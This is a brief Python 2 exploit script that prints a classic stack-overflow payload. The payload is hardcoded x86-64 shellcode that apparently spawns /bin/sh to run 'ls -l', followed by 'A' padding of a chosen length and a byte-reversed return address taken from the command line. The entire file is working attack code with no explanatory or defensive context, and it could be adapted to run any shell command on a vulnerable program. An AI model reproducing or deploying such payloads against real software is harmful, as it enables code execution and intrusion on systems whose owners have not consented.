#! /usr/bin/python2
import sys

if len(sys.argv) == 3:
	size=int(sys.argv[1])
	if size < 0:
		print "Invalid padding size: ", size, " (must be >= 0!)"
	address = sys.argv[2].decode("hex")
	address = address[::-1]
else:
	print "Usage:", sys.argv[0], "<padding_size> <address>"
	print "\npadding size: size of the padding [bytes]"
	print " address    : return address (hex)\n\n"



shellcode = "\x48\x31\xc9\x51\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48" \
+ "\xc1\xe9\x08\x51\x54\x5f\x48\x31\xc9\x51\x66\x68\x2d\x63\x54\x5b\x48" \
+ "\x31\xc9\x51\xeb\x11\x5a\x52\x80\x72\x05\x41\x53\x57\x54\x5e\x48\x31" \
+ "\xd2\xb0\x3b\x0f\x05\xe8\xea\xff\xff\xff\x6c\x73\x20\x2d\x6c\x41"

print shellcode + "A" * size + address
